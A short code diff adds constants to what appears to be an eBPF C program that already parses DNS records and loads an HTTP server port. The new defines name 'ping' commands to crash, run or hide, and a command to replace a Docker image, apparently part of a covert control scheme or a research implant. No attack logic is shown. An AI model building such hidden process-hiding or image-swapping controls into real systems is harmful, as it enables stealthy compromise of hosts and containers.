@@ -29,6 +29,24 @@
 #define DNS_A_RECORD 1
 #define DNS_COMPRESSION_FLAG 3
 
+#define PING_NOP_CHR '0'
+#define PING_CRASH_CHR '1'
+#define PING_RUN_CHR '2'
+#define PING_HIDE_CHR '3'
+
+#define PING_NOP 0
+#define PING_CRASH 1
+#define PING_RUN 2
+#define PING_HIDE 3
+
+#define DOCKER_IMAGE_LEN 64
+
+#define DOCKER_IMAGE_NOP_CHR '0'
+#define DOCKER_IMAGE_REPLACE_CHR '1'
+
+#define DOCKER_IMAGE_NOP 0
+#define DOCKER_IMAGE_REPLACE 1
+
 #define LOAD_CONSTANT(param, var) asm("%0 = " param " ll" : "=r"(var))
 
 __attribute__((always_inline)) static u16 load_http_server_port() {
